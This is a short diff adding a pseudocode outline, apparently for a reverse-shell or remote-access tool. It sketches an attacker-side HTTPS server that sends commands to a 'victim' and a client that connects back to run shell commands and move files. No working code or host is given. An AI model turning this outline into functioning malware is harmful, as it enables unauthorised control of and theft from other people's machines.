@@ -1,0 +1,17 @@
+create_self_signed_cert()
+# httpd_socket_with_ssl
+while True:
+    do_GET()
+        # send_commands_to_victim
+    do_POST()
+        # receive_commands_output_from_victim
+        # get_file_from_victim
+        # put_file_in_victim
+
+while True:
+    # do_get_back_to_attacker_machine
+    # process_command_received:
+        # quit_command
+        # get_a_file_command
+        # put_a_file_command
+        # shell_command
